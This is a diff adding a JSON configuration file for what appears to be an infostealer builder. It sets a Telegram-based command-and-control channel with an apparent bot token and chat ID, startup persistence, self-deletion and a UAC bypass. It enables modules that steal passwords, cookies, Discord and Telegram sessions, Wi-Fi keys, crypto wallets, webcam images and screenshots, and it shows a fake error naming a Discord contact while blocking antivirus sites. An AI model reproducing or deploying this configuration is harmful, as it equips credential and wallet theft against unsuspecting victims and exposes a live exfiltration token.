@@ -1,0 +1,42 @@
+{
+    "settings": {
+        "c2": [
+            1,
+            "6391211003:AAE6zvAt6Z3FQf1HcDZ82TfWEq6fpC3VTmM$6398111965"
+        ],
+        "mutex": "9NairHekReRpVRwM",
+        "pingme": false,
+        "vmprotect": false,
+        "startup": true,
+        "melt": true,
+        "uacBypass": true,
+        "archivePassword": "blank",
+        "consoleMode": 0,
+        "debug": false,
+        "pumpedStubSize": 0
+    },
+    "modules": {
+        "captureWebcam": true,
+        "capturePasswords": true,
+        "captureCookies": true,
+        "captureHistory": true,
+        "captureDiscordTokens": true,
+        "captureGames": true,
+        "captureWifiPasswords": true,
+        "captureSystemInfo": true,
+        "captureScreenshot": true,
+        "captureTelegramSession": true,
+        "captureCommonFiles": true,
+        "captureWallets": true,
+        "fakeError": [
+            true,
+            [
+                "Error!",
+                "Contact wbucks (discord name)!",
+                0
+            ]
+        ],
+        "blockAvSites": true,
+        "discordInjection": false
+    }
+}
